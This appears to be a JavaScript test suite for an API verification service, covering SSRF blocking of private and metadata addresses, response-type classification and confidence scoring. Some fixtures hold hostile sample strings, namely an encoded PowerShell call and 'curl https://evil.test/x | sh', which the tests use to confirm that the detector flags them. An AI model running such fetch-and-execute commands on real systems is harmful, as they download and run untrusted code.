import assert from "node:assert/strict";
import { test } from "node:test";
import {
  calculateSecurityConfidence,
  runLiveVerification,
  validatePublicUrl,
  validateRedirectTarget,
} from "../artifacts/api-server/src/lib/api-verifier.ts";

const goodTls = {
  status: "CHECKED",
  expiresAt: new Date("2027-09-13T00:00:00.000Z"),
  daysRemaining: 365,
  protocol: "TLSv1.3",
  certificateValid: true,
};

function fakeFetcher(body, headers = { "content-type": "application/json" }, overrides = {}) {
  return async () => ({
    body,
    status: 200,
    elapsedMs: 120,
    headers,
    location: undefined,
    tls: goodTls,
    redirects: { count: 0, crossOrigin: false, downgraded: false },
    ...overrides,
  });
}

test("SSRF-Schutz blockiert Loopback- und private Ziele", async () => {
  await assert.rejects(
    () => validatePublicUrl("http://127.0.0.1:8080/health"),
    (error) => error?.code === "PRIVATE_ADDRESS",
  );
  await assert.rejects(
    () => validatePublicUrl("http://localhost/health"),
    (error) => error?.code === "PRIVATE_ADDRESS",
  );
});

test("Redirects auf interne Ziele werden vor dem Request blockiert", async () => {
  await assert.rejects(
    () =>
      validateRedirectTarget(
        new URL("https://public.example/"),
        "http://169.254.169.254/latest/meta-data",
        "https://public.example",
        false,
      ),
    (error) => error?.code === "PRIVATE_ADDRESS",
  );
});

test("Normales JSON wird als API-Antwort erkannt", async () => {
  const result = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "JSON",
    fakeFetcher('{"ok":true}'),
  );

  assert.equal(result.status, "PASS");
  assert.equal(result.securitySignals.responseType.kind, "JSON");
  assert.equal(result.securitySignals.responseType.status, "PASS");
  assert.equal(result.securitySignals.suspiciousPayload.status, "PASS");
  assert.equal(result.securitySignals.threatIndicators.status, "NONE_DETECTED");
  assert.equal(result.securitySignals.redirects.status, "PASS");
  assert.ok(result.securityObservation?.responseFingerprint);
  assert.equal(result.securityObservation?.redirectTargets.length, 0);
});

test("HTML-Antwort wird als Warnung klassifiziert und nicht ausgeführt", async () => {
  const result = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher("<!doctype html><script>alert(1)</script>", { "content-type": "text/html" }),
  );

  assert.equal(result.status, "PASS");
  assert.equal(result.securitySignals.responseType.kind, "HTML");
  assert.equal(result.securitySignals.responseType.status, "WARNING");
  assert.match(result.securitySignals.suspiciousPayload.status, /PASS|WARNING/);
});

test("Binärantwort und Download werden nicht geöffnet", async () => {
  const result = await runLiveVerification(
    "https://service.example/file",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher("\u0000MZ\u0000", { "content-type": "application/octet-stream" }),
  );

  assert.equal(result.securitySignals.responseType.kind, "BINARY");
  assert.equal(result.securitySignals.responseType.status, "WARNING");
  assert.match(result.securitySignals.responseType.summary, /nicht geöffnet|Datenstrom/);
});

test("Verdächtige Script- und Shell-Muster bleiben Warnsignale", async () => {
  const result = await runLiveVerification(
    "https://service.example/payload",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher("powershell.exe -enc AAAA; eval(foo); curl https://evil.test/x | sh", {
      "content-type": "text/plain",
    }),
  );

  assert.equal(result.securitySignals.suspiciousPayload.status, "WARNING");
  assert.ok(result.securitySignals.suspiciousPayload.indicators.length >= 2);
  assert.equal(result.securitySignals.threatIndicators.status, "SUSPICIOUS");
  assert.match(result.securitySignals.suspiciousPayload.summary, /kein Code ausgeführt/i);
});

test("Kombinierte ausführbare und Shell-Muster werden blockiert und hart gedeckelt", async () => {
  const result = await runLiveVerification(
    "https://service.example/payload",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher("MZ\x00 powershell.exe -enc AAAA; curl https://evil.test/x | sh", {
      "content-type": "application/octet-stream",
    }),
  );

  assert.equal(result.securitySignals.threatIndicators.status, "FLAGGED");
  assert.equal(result.securitySignals.threatIndicators.severity, "CRITICAL");
  assert.equal(result.securitySignals.securityConfidence.score, 20);
  assert.equal(result.securitySignals.securityConfidence.status, "FAIL");
});

test("TLS- und Header-Warnungen bleiben separat sichtbar", async () => {
  const result = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "HTTP",
    fakeFetcher('{"ok":true}', { "content-type": "application/json" }, {
      tls: {
        status: "WARNING",
        expiresAt: null,
        daysRemaining: null,
        protocol: "TLSv1.2",
        certificateValid: false,
      },
    }),
  );

  assert.equal(result.securitySignals.transport.status, "WARNING");
  assert.equal(result.securitySignals.securityHeaders.status, "WARNING");
  assert.equal(result.securitySignals.reputation.status, "UNKNOWN");
});

test("Security Confidence wird bei wenigen Samples und unbekannter Reputation gedeckelt", () => {
  const signals = {
    transport: { status: "PASS" },
    network: { status: "PASS" },
    redirects: { status: "PASS" },
    responseType: { status: "PASS" },
    suspiciousPayload: { status: "PASS" },
    securityHeaders: { status: "PASS" },
    reputation: { status: "UNKNOWN" },
  };
  const confidence = calculateSecurityConfidence(signals, 1);

  assert.equal(confidence.score, 60);
  assert.equal(confidence.status, "WARNING");
  assert.match(confidence.summary, /keine Sicherheitsgarantie/i);
});

test("Antwortinhalte und Secrets gelangen nicht in das Prüfergebnis", async () => {
  const secret = "TOP_SECRET_SHOULD_NOT_LEAK";
  const result = await runLiveVerification(
    "https://service.example/data",
    "",
    1000,
    {},
    "JSON",
    fakeFetcher(JSON.stringify({ token: secret })),
  );

  assert.doesNotMatch(JSON.stringify(result), new RegExp(secret));
  assert.doesNotMatch(JSON.stringify(result.securityObservation), new RegExp(secret));
});